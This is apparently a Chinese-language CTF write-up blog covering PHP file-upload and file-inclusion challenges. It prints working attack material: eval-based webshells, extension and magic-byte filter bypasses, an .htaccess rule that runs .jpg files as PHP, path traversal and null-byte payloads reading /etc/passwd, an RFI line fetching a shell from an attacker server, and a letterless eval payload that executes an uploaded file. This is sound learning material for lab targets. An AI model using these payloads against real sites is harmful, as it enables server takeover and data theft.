---
title: web-文件上传+包含
date: 2026-01-21 19:39:43
tags: [web-文件上传+包含]
categories:
  - ctf题解
  - web
---

## web-文件上传+包含

## [第二章 web进阶]文件上传 1 文件上传漏洞 题解

1.上传webshell.jpg文件

2.发现上传成功却无法打开

是因为上传的目录是随机的，所以用御剑扫描即可，找到对应网页 打开



## [ACTF2020 新生赛]Upload 1

十分波折的一道题目哈

1.文件上传php，失败，显示只能jpg等一堆正常格式

2.上传木马jpg，改成php，nonono

3.那改成phtml？黑名单绕过，可以

4.蚁剑连接得到flag

注意linux系统查看当前目录flag需要 cat /flag

```plaintext
1. 直接上传.php文件 → 失败（前端/后端检测后缀，仅允许jpg/png等图片格式）；
2. 上传图片马）→ 尝试抓包改回.php → 提示no（后端黑名单拦截.php）；
3. 黑名单绕过：改后缀为.phtml（Apache默认解析.phtml为PHP）→ 上传成功；
    细节：Content-Type为image/jpeg不改（绕MIME校验），仅改filename为xxx.phtml；
4. 蚁剑连接：
5. 拿flag：Linux系统下执行命令 cat /flag（题目flag在根目录）
```

```
GIF89
```





## [极客大挑战 2019]Upload

### 1题解

1.上传webshell.jpg被识破了

2.换种思路  文件里面 木马前面加个**GIF 图片文件的文件头标识**GIF89，上传成功

3.抓包后缀改成php，no；php5，no，说明是黑名单绕过，来个phtml，ok

4.蚁剑连接















## 13 第十三章 通幽关·灵纹诡影

这道题真让我难受

题目：

- 仅受仙灵之气浸润的「云纹图」可修复玉魄核心（建议扩展名：.jpg）
- 灵纹尺寸不得大于三寸（30000字节）
- 灵纹必须包含噬心魔印（十六进制校验码：FFD8FF）

1.首先他只是建议jpg，实际上你可以传php然后把头改成FFD8FF，保存后上传

2.抓包然后改成Content-Type: image/jpeg

3.蚁剑连接

我的错误点：

1.一开始用jpg上传，成功后没有更改后缀为php就蚁剑连接了。不是php怎么让木马生效？

2.改成了php，发现抓包后返回内容为：

"\xff\xd8\xff<script language=\"php\">eval\x28$_POST['cmd']\x29;</script>\x0d\x0a\x0d\x0a"



于是删掉头和尾再上传，发现上传不成功（服务器没法把`\xff\xd8\xff`转成真实的 FFD8FF 二进制头）

3.用<FilesMatch "\.jpg$">
    SetHandler application/x-httpd-php
</FilesMatch>

发现还是不成功

（

先传`.htaccess`再传`.jpg`木马的核心逻辑

「先改规则，再用规则」



`.htaccess`是「规则文件」，作用是告诉服务器：“从现在开始，`/uploads`目录下的`.jpg`文件都按 PHP 解析”。

传完`.htaccess`后，必须用`test.jpg`（含`phpinfo()`）验证规则是否生效：

- 若验证失败（看不到 PHP 信息），说明`.htaccess`没起作用，继续传`.jpg`木马也是浪费时间，直接放弃这条路；
- 若验证成功，再传真实木马，避免做无用功。





## 14 第十四章 御神关·补天玉碑

提示是htaccess

1.上传htaccess

2.上传木马图

3.蚁剑连接

这里蚁剑出现返回数据为空，是因为我的木马是<script language="php">eval($_POST['cmd']);</script>

| 写法                                  | 兼容性        | 是否生效 | 蚁剑连接结果           |
| ------------------------------------- | ------------- | -------- | ---------------------- |
| `<?php eval($_POST['cmd']);?>`        | 所有 PHP 版本 | ✅ 生效   | 正常（空返回但可操作） |
| `<script language="php">...</script>` | 仅 PHP5.3-    | ❌ 不生效 | 完全空返回，无法操作   |









## [BSidesCF 2020]Had a bad day

### 1

## 文件包含漏洞

#### 1. 本地文件包含（LFI）

比如 PHP 网站有代码：`include($_GET['page']);`

攻击者访问：`http://xxx.com/index.php?page=../../../../etc/passwd`

→ 服务器会读取 Linux 系统的`/etc/passwd`文件（存储用户信息的敏感文件）并返回。

#### 2. 远程文件包含（RFI）

如果服务器允许包含远程文件，代码还是`include($_GET['page']);`

攻击者访问：`http://xxx.com/index.php?page=http://攻击者服务器/恶意木马.php`→ 服务器会下载并执行这个远程木马，攻击者直接控制服务器。



1.先用伪协议读取index.php源码

```
php://filter/read=convert.base64-encode/resource=index
```

为什么不加php变成index.php，因为后端自动拼接php给文件了



源码:

```
            </div>
            <h3>Cheer up!</h3>
              <p>
                Did you have a bad day? Did things not go your way today? Are you feeling down? Pick an option and let the adorable images cheer you up!
              </p>
              <div class="page-include">
              <?php
				$file = $_GET['category'];

				if(isset($file))
				{
					if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")){
						include ($file . '.php');
					}
					else{
						echo "Sorry, we currently only support woofers and meowers.";
					}
				}
				?>
			</div>
 
```



漏洞 1：strpos($file, "index") 少写了!== false（最致命）
strpos函数的返回规则：

    找到字符串：返回匹配的位置（数字，比如indexabc返回 0）；
    没找到：返回false。

正常校验应该写strpos(...) !== false（严格判断 “找到”），但代码里只写了strpos($file, "index")：

    只要$file里有index，strpos返回数字（非 false），条件成立；
    更关键：如果$file以index开头（比如index../../etc/passwd），strpos返回 0，条件也成立！



漏洞 2：include(`$file . '.php'`) 是 “拼接后缀”，可通过截断 / 路径穿越绕
代码会自动给`$file`加.php后缀（比如传woofers，实际包含woofers.php），但攻击者可以用「路径穿越 + 空字节 / 截断」绕过：

    比如传woofers/../../etc/passwd%00：
    拼接后变成woofers/../../etc/passwd%00.php；
    %00是 PHP 的 “空字节截断”，会让 PHP 忽略后面的.php，实际包含woofers/../../etc/passwd（读取系统敏感文件）。



2.访问 index.php?category=woofers/../flag

为什么这么做？



`文件包含逻辑：`

代码会把用户传入的 category 参数值（也就是 woofers/../flag）拼接到 include 函数里，还会自动加 .php 后缀，即 include(参数值 + '.php')；

`白名单校验逻辑：`

只要参数值里包含 woofers/meowers/index，就允许执行这个 include 操作（否则拒绝）。

​	

    1.参数值woofers/../flag的含义
    
    /../：是「路径穿越符」（Linux/PHP 里，A/../B 等价于 B）；
    比如woofers/../flag → 实际等价于flag（先进入 woofers 目录，再返回上一级，最终指向 flag）；
    整个参数值的核心：用woofers凑白名单，用/../抵消掉它，最终指向flag。

```
2.代码拼接后的实际包含路径
代码会自动给参数值加.php后缀，所以：
用户传的category=woofers/../flag → 拼接后变成 woofers/../flag.php。
```



抓包得到多出了一句话：

​       <!-- Can you read this flag? -->

出现了别的内容，包含成功了flag.php，但是这里也说了flag需要读取
利用php://filter伪协议可以套一层协议读取flag.php



3.读取flag



伪协议格式：

?file=php://filter/read=convert.base64-encode/resource=你想要看的文件



php://filter伪协议可以套一层协议，就像：

```
php://filter/read=convert.base64-encode/woofers/resource=flag
```

这样提交的参数既包含有woofers这个字符串，也不会影响正常的包含，得到Flag.php：







## 11 第十一章 千机变·破妄之眼

省流：HDdss看到了 **GET**  参数名由`m,n,o,p,q`这五个字母组成（每个字母出现且仅出现一次），长度正好为 5，虽然不清楚字母的具体顺序，但是他知道**参数名等于参数值**才能进入。

其实也就是输入mnopq=mnopq就ok，关键是你不知道顺序，也无法短时间内枚举，那就抛给脚本

```
import itertools
import requests

for p in itertools.permutations("mnopq"):   #itertools.permutations这就在枚举
    k = "".join(p)  #把p写进去
    r = requests.get("http://127.0.0.1:48386/", params={k: k})  #params={k:k}?-->mnopq=mnopq
    if "flag" in r.text:
        print(k)
        print(r.text)
        break
```



1.`params` 是 **requests 帮你自动处理 GET 参数的东西**

2.

```
requests.get(url, params={"a": "1"})
```

requests 内部其实做了👇

url + "?" + "a=1"

也就是：

http://target/index.php?a=1



然后出现了flag.php，find.php 

分别进去发现：

flag.php 他说答案已经在这里了，你看不到

find.php 是一个新的查看界面，查看flag，仍然出现”答案已经在这里了，你看不到“

所以换个思路，我们可以用伪协议读取64编码过的flag.php源码



```
php://filter/read=convert.base64-encode/resource=./flag.php
```



![image-20251218152437400](/images/image-20251218152437400.png)















## moectf web 这是...Webshell？



```
 <?php
highlight_file(__FILE__);
if(isset($_GET['shell'])) {
    $shell = $_GET['shell'];
    if(!preg_match('/[A-Za-z0-9]/is', $_GET['shell'])) {
        eval($shell);
    } else {
        echo "Hacker!";
    }
}
?> 
```

所有字母数字都被过滤了

因为直接写命令的路被堵死，所以 “上传命令文件→用纯符号找文件执行”











#### Payload（`?shell=?><?=`.+/???/????????[@-[]`;?>`）

| 部分            | 作用                                 | 通俗解释                                                     |
| --------------- | ------------------------------------ | ------------------------------------------------------------ |
| `?><?=`         | 闭合原 PHP 标签，开启短标签执行      | 原代码是`eval($shell)`，加这个能直接执行后面的内容           |
| `.`             | 执行系统命令的简写                   | 在 Linux 里，`. filename` 等价于 `source filename`（执行文件里的命令） |
| `/???/????????` | 通配符，匹配「临时文件路径」         | 上传的文件会被 PHP 存到系统临时目录（比如 `/tmp/phpXXXXXX`），`???` 匹配 `tmp`，`????????` 匹配随机文件名（8 个字符） |
| `[@-[]`         | 通配符，匹配「临时文件名的最后部分」 | `@` 的 ASCII 码是 64；                                                           `[` 的 ASCII 码是 91；                                                                             `[@-[]` 翻译：**匹配 ASCII 码 64 到 91 之间的所有字符**。                                                                       利用 ASCII 码范围匹配随机字符，确保能精准命中上传的临时文件 |



`[@-[]` 匹配的是 ASCII 码**64（@）到 91（[）** 的字符，包含：

   @（64）、A-Z（65-90）、[（91）；



Payload 翻译：`执行 /tmp/ 目录下的那个PHP临时文件（也就是我们上传的含命令的文件）`









上传的文件里写：



```bash
#! /bin/bash
env
```

- `#! /bin/bash`：告诉系统这是一个 bash 脚本，要按命令执行；
- `env`：输出系统环境变量（很多 CTF 的 flag 会藏在环境变量里，比如 `flag=xxx`）；
- 也可以把 `env` 改成 `cat /flag`，直接读取 flag 文件。











